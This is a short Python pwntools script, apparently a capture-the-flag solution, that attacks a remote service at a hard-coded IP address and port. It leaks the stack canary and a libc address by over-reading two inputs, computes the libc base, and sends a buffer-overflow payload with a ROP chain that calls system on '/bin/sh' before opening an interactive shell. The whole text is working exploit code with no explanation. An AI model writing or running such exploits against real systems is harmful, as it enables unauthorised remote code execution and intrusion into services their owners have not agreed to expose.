from pwn import *

###Addr
libc_start_offset = 0x26a80
system_offset = 0x52fd0
bin_sh_offset = 0x1afb84

###ROPgadget
L_pop_rdi = 0x26542
L_nop = 0x3148f

###Exploit
r = remote('140.112.31.97',30102)

r.sendafter('name : ','a'*0x19)
r.recvuntil('a'*0x19)
canary = b'\x00'+r.recv(7)
print(hex(u64(canary)))

r.sendafter('here : ','a'*0x28)
r.recvuntil('a'*0x28)
libc_start_addr = u64(r.recv(6)+b'\x00\x00')-235
libc_base = libc_start_addr-libc_start_offset
print(hex(libc_base))

padding = b'a'*0x18
fakerbp = p64(0)
ROPchain = p64(libc_base+L_nop)+\
           p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+system_offset)

payload = padding+canary+fakerbp+ROPchain
r.sendafter('remarks? ',payload)

r.interactive()
